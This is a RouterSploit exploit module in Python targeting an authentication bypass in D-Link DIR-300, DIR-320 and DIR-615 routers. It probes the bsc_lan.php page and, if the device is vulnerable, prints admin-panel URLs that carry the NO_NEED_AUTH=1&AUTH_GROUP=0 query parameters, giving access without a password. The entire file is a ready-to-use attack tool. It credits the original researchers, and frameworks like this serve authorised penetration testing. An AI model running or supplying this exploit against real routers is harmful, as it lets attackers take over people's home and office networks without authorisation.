from routersploit import (
    exploits,
    print_success,
    print_error,
    print_info,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DIR-300, DIR-320, DIR-615 Authentication Bypass vulnerability.
    If the target is vulnerable link to bypass authentication will be provided"
    """
    __info__ = {
        'name': 'D-Link DIR-300 & DIR-320 & DIR-615 Auth Bypass',
        'description': 'Module exploits authentication bypass vulnerability in D-Link DIR-300, DIR-320, DIR-615'
                       'revD devices. It is possible to access administration panel without providing password.',
        'authors': [
            'Craig Heffner',  # vulnerability discovery
            'Karol Celin',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf',
        ],
        'devices': [
            'D-Link DIR-300',
            'D-Link DIR-600',
            'D-Link DIR-615 revD',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_info("\nYou need to add NO_NEED_AUTH=1&AUTH_GROUP=0 to query string for every action.")
            print_info("\nExamples:")
            print_info("{}:{}/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0".format(self.target, self.port))
            print_info("{}:{}/bsc_wlan.php?NO_NEED_AUTH=1&AUTH_GROUP=0\n".format(self.target, self.port))
        else:
            print_error("Target seems to be not vulnerable")

    @mute
    def check(self):
        # check if it is valid target
        url = "{}:{}/bsc_lan.php".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return False  # target is not vulnerable

        # checking if authentication can be baypassed
        url = "{}:{}/bsc_lan.php?NO_NEED_AUTH=1&AUTH_GROUP=0".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if '<form name="frm" id="frm" method="post" action="login.php">' not in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
